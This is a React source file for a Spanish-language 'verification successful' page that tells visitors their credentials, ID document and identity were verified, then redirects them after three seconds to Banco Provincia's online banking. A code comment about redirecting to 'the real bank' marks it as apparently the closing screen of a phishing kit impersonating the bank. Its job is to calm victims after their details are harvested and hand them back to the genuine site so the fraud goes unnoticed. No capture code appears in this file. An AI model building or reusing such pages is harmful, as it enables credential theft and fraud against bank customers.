import { useEffect, useState } from 'react';

export default function VerificationSuccess() {
  const [progress, setProgress] = useState(0);
  const [isLoaded, setIsLoaded] = useState(false);
  const [countdown, setCountdown] = useState(3);

  useEffect(() => {
    setTimeout(() => setIsLoaded(true), 100);
    
    // Barra de progreso
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + 4;
      });
    }, 25);

    // Countdown
    const countdownInterval = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(countdownInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    // Redirección automática al banco real en 3 segundos
    const timeout = setTimeout(() => {
      window.location.replace('https://www.bancoprovincia.bancainternet.com.ar/spa/');
    }, 3000);

    return () => {
      clearInterval(interval);
      clearInterval(countdownInterval);
      clearTimeout(timeout);
    };
  }, []);

  return (
    <div className="min-h-screen min-h-[100dvh] bg-gradient-to-br from-emerald-50 via-white to-teal-50 flex items-center justify-center px-4 py-8 relative overflow-hidden">
      {/* Fondo decorativo */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[800px] h-[800px] bg-gradient-to-br from-emerald-400/20 to-teal-400/20 rounded-full blur-3xl -translate-y-1/2"></div>
        <div className="absolute bottom-0 left-0 w-96 h-96 bg-gradient-to-tr from-green-400/10 to-cyan-400/10 rounded-full blur-3xl"></div>
      </div>

      <div className={`relative z-10 max-w-xl w-full transition-all duration-700 ${isLoaded ? 'opacity-100 scale-100' : 'opacity-0 scale-95'}`}>
        {/* Icono de éxito animado */}
        <div className="text-center mb-8">
          <div className="inline-block relative">
            <div className="absolute inset-0 bg-emerald-400 rounded-full animate-ping opacity-50"></div>
            <div className="absolute inset-0 bg-emerald-400 rounded-full animate-pulse opacity-30 scale-125"></div>
            <div 
              className="relative rounded-full p-6 sm:p-8 shadow-2xl"
              style={{ background: 'linear-gradient(135deg, #1e8a5e 0%, #22a06b 50%, #2eb8a0 100%)' }}
            >
              <svg 
                className="w-16 h-16 sm:w-24 sm:h-24 text-white" 
                fill="none" 
                stroke="currentColor" 
                viewBox="0 0 24 24"
              >
                <path 
                  strokeLinecap="round" 
                  strokeLinejoin="round" 
                  strokeWidth={3} 
                  d="M5 13l4 4L19 7"
                  className="checkmark-path"
                />
              </svg>
            </div>
          </div>
        </div>

        {/* Mensaje principal */}
        <div className="bg-white/95 backdrop-blur-sm rounded-2xl shadow-2xl p-6 sm:p-8 mb-6 border border-gray-100">
          <h1 className="text-2xl sm:text-3xl font-bold text-center text-gray-900 mb-2">
            ¡Verificación Exitosa!
          </h1>
          <p className="text-center text-gray-600 text-base sm:text-lg mb-6">
            Sus datos fueron verificados correctamente
          </p>

          {/* Barra de progreso */}
          <div className="mb-6">
            <div className="bg-gray-200 rounded-full h-3 overflow-hidden shadow-inner">
              <div 
                className="h-full transition-all duration-200 ease-out rounded-full"
                style={{ 
                  width: `${progress}%`,
                  background: 'linear-gradient(90deg, #1e8a5e 0%, #22a06b 50%, #2eb8a0 100%)'
                }}
              ></div>
            </div>
            <p className="text-center text-sm text-gray-600 mt-3 font-medium">
              Redirigiendo a Banca Internet Provincia en <span className="text-emerald-600 font-bold">{countdown}</span> segundos...
            </p>
          </div>

          {/* Resumen */}
          <div className="space-y-3 mb-6">
            {[
              { icon: '✓', title: 'Credenciales verificadas' },
              { icon: '✓', title: 'Documento validado' },
              { icon: '✓', title: 'Identidad confirmada' },
            ].map((item, index) => (
              <div key={index} className="flex items-center gap-3 p-3 bg-emerald-50 rounded-xl border border-emerald-100">
                <div className="w-8 h-8 bg-emerald-500 rounded-full flex items-center justify-center text-white font-bold text-sm">
                  {item.icon}
                </div>
                <span className="text-gray-800 font-medium">{item.title}</span>
              </div>
            ))}
          </div>

          {/* Info de seguridad */}
          <div className="bg-blue-50 border-l-4 border-blue-500 p-4 rounded-r-lg">
            <p className="text-sm text-blue-800">
              <strong>🔒 Conexión segura:</strong> Será redirigido al sitio oficial del Banco Provincia.
            </p>
          </div>
        </div>

        {/* Botón manual por si falla la redirección */}
        <div className="text-center">
          <button
            onClick={() => window.location.replace('https://www.bancoprovincia.bancainternet.com.ar/spa/')}
            className="inline-flex items-center gap-2 bg-white/80 backdrop-blur-sm px-6 py-3 rounded-full shadow-lg text-emerald-700 font-medium hover:bg-white transition-all"
          >
            <span>Continuar ahora</span>
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 5l7 7m0 0l-7 7m7-7H3" />
            </svg>
          </button>
        </div>
      </div>

      <style>{`
        @keyframes checkmark {
          0% { stroke-dasharray: 0 50; }
          100% { stroke-dasharray: 50 50; }
        }
        .checkmark-path {
          animation: checkmark 0.8s ease-in-out 0.3s forwards;
          stroke-dasharray: 0 50;
        }
      `}</style>
    </div>
  );
}
